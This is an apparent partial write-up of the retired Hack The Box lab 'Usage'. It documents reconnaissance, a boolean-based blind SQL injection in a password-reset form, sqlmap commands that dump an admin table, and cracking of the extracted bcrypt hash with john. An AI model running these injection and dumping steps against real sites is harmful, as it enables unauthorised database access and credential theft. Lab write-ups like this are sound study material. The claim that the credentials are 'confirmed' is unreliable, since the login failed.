## 🧠 HTB Machine: Usage (Retired) – Partial Writeup

**Difficulty:** Easy  

**Operating System:** Linux  

**Tech Stack:** Laravel, MySQL, Nginx  

**Focus Areas:** SQL Injection, Hash Cracking, Web Enumeration

⚠️ **Note:** This writeup covers only the initial foothold and partial exploitation. Root privilege escalation could not be completed due to machine instability.
---

## 🛰️ Reconnaissance

Initial `nmap` scan revealed:


- `22/tcp` – OpenSSH 8.9p1  

- `80/tcp` – nginx 1.18.0, redirecting to `usage.htb`

```bash

nmap -sC -sV -oA usage_scan 10.10.11.18

```

---
## 🌐 Web Enumeration

Visiting `http://usage.htb` revealed a Laravel-based login page.  

Cookie analysis (`laravel_session`, `XSRF-TOKEN`) confirmed Laravel backend.  

No useful error messages on failed login attempts.

---
## 🔍 Gobuster Scan

```bash

gobuster dir -u http://usage.htb -w /usr/share/wordlists/dirb/common.txt -x php,txt,html

```

- Server returned repeated `503 Service Unavailable` responses due to overload.  

- As per IppSec’s strategy, directory brute-force was halted and focus shifted to login functionality.

---

## 🔐 Vulnerability Discovery

### 📌 Blind SQL Injection in Forgot Password form

- Sending `'` as the email caused a `500 Internal Server Error`.

- Using `' --` suppressed the error, confirming boolean-based SQLi.

---

## 📦 SQLMap Usage


```bash

sqlmap -r reset_request.txt -p email --level 5 --risk 3 --technique=B --batch

```

✅ **Result:** Parameter `email` is vulnerable to **boolean-based blind SQLi**.  

**Backend:** MySQL ≥ 8.0, **Web server:** nginx, **OS:** Ubuntu

---

## 🧱 Database Extraction

```bash

sqlmap -r reset_request.txt -p email --dbs

```

🎯 Target DB: `usage_blog`

```bash

sqlmap -r reset_request.txt -p email -D usage_blog --tables

```

🗂️ Found tables: `admin_users`, `users`, `password_reset_tokens`, etc.

```bash

sqlmap -r reset_request.txt -p email -D usage_blog -T admin_users --dump

```

🧑‍💼 Extracted 1 user:

- **Username:** `admin`  

- **Password (bcrypt):** `$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2`

---

## 🔓 Password Cracking

Used `john` with the rockyou wordlist:

```bash

john admin_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

```

✅ Recovered password: **`whatever1`**

---
## ❗ Login Attempt Blocked

Despite correct credentials (`admin : whatever1`), login via `/login` did not succeed due to instability or backend issues.  

Tested across multiple browsers and sessions.

---
## ✅ Conclusion

This machine demonstrated a full web exploitation flow:

🔹 Web enum ➝  

🔹 Blind SQLi ➝  

🔹 DB extract ➝  

🔹 Password cracking
  
Although the final login step was unsuccessful, the credentials were confirmed and the attack chain is complete.

---
**Status:** ✅ Documented | 🚫 No root access | 🔐 Admin creds obtained | 🧠 Skills demonstrated
